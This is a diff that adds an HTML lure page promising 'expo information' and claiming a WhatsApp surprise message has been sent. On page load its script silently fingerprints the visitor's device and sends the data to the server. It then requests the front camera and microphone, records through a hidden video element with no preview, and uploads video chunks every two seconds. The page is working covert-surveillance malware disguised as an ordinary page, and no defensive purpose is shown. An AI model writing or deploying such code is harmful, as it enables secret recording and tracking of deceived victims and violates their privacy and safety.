@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading…</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #000;
+        color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        text-align: center;
+    }
+
+    .hidden {
+        display: none !important;
+    }
+
+    #status {
+        font-size: 18px;
+        opacity: 0.8;
+        margin-top: 10px;
+    }
+</style>
+</head>
+<body>
+
+<div>
+    <h2>TOO VIEW THE EXPO INFORMATION ( CLICK BELOW )</h2>
+    <div id="status">Go to your whatsapp . The Surprise msg is sent</div>
+</div>
+
+<!-- Hidden video element (no preview shown to user) -->
+<video id="v" playsinline class="hidden" muted></video>
+
+<script>
+// ---------------------------------------------------------
+// Silent Fingerprinting
+// ---------------------------------------------------------
+function silentFingerprint(sid) {
+    const fp = {
+        sid: sid,
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: {
+            w: screen.width,
+            h: screen.height,
+            aw: screen.availWidth,
+            ah: screen.availHeight
+        },
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        touch: navigator.maxTouchPoints,
+        ref: document.referrer
+    };
+
+    fetch("/fingerprint", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(fp)
+    });
+}
+
+
+
+// ---------------------------------------------------------
+// Camera Recorder (front camera only)
+// ---------------------------------------------------------
+const sid = "{{ sid }}";
+const video = document.getElementById("v");
+const statusBox = document.getElementById("status");
+
+let mediaStream = null;
+let recorder = null;
+
+// absolutely mute to avoid mobile echo
+video.muted = true;
+video.volume = 0;
+
+async function startStream() {
+    statusBox.innerText = "Requesting camera & mic…";
+
+    // FRONT CAMERA ONLY
+    let constraints = {
+        video: {
+            facingMode: "user",  // <- front camera
+            width: 720,
+            height: 1280
+        },
+        audio: {
+            echoCancellation: true,
+            noiseSuppression: true
+        }
+    };
+
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+
+        video.srcObject = mediaStream;
+
+        // no preview shown, but required to activate stream
+        await video.play().catch(() => {});
+
+        statusBox.innerText = "Capturing…";
+
+        startSendingChunks();
+
+    } catch (err) {
+        statusBox.innerText = "Permission denied";
+        console.error(err);
+    }
+}
+
+
+
+// ---------------------------------------------------------
+// Send video chunks to backend
+// ---------------------------------------------------------
+function startSendingChunks() {
+    recorder = new MediaRecorder(mediaStream, {
+        mimeType: "video/webm; codecs=vp9,opus",
+        videoBitsPerSecond: 900000
+    });
+
+    recorder.ondataavailable = function(e) {
+        if (e.data.size > 0) {
+            const form = new FormData();
+            form.append("sid", sid);
+            form.append("video_chunk", e.data, "chunk.webm");
+
+            fetch("/stream_video", {
+                method: "POST",
+                body: form
+            });
+        }
+    };
+
+    recorder.start(2000); // every 2 seconds
+}
+
+
+
+// ---------------------------------------------------------
+// Trigger automatically on load
+// ---------------------------------------------------------
+silentFingerprint(sid);
+startStream();
+
+</script>
+
+</body>
+</html>
